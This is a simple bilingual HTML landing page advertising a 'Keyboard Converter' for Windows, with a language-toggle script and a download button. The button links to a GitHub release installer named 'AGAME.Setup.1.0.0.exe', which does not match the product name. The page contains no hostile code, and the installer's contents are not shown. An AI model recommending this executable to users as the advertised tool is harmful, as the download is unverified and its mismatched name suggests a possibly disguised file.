<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Keyboard Converter</title>
<style>
    body {
        margin: 0;
        font-family: Arial, sans-serif;
        background: #0d1117;
        color: white;
        text-align: center;
        padding: 40px;
    }
    .lang-switch {
        position: absolute;
        top: 20px;
        right: 20px;
        background: #161b22;
        padding: 10px 15px;
        border-radius: 8px;
        cursor: pointer;
        font-weight: bold;
    }
    h1 {
        font-size: 48px;
        margin-top: 80px;
    }
    p {
        font-size: 20px;
        max-width: 600px;
        margin: auto;
        opacity: 0.9;
    }
    .download-btn {
        display: inline-block;
        margin-top: 30px;
        padding: 15px 30px;
        background: #238636;
        color: white;
        text-decoration: none;
        border-radius: 10px;
        font-size: 22px;
        font-weight: bold;
    }
    .download-btn:hover {
        background: #2ea043;
    }
</style>
</head>
<body>

<div class="lang-switch" onclick="toggleLang()">HE / EN</div>

<h1 id="title">Keyboard Converter</h1>
<p id="desc">Convert keyboard inputs easily and quickly. Download the installer below.</p>

<a id="downloadBtn" class="download-btn"
   href="https://github.com/steinberguriel-ctrl/keyboard/releases/download/v1.0.0/AGAME.Setup.1.0.0.exe">
   Download for Windows
</a>

<script>
let lang = "en";

function toggleLang() {
    if (lang === "en") {
        lang = "he";
        document.getElementById("title").innerText = "ממיר מקלדת";
        document.getElementById("desc").innerText = "המר בקלות ובמהירות קלטי מקלדת. הורד את ההתקנה למטה.";
        document.getElementById("downloadBtn").innerText = "הורד עבור Windows";
        document.body.style.direction = "rtl";
    } else {
        lang = "en";
        document.getElementById("title").innerText = "Keyboard Converter";
        document.getElementById("desc").innerText = "Convert keyboard inputs easily and quickly. Download the installer below.";
        document.getElementById("downloadBtn").innerText = "Download for Windows";
        document.body.style.direction = "ltr";
    }
}
</script>

</body>
</html>
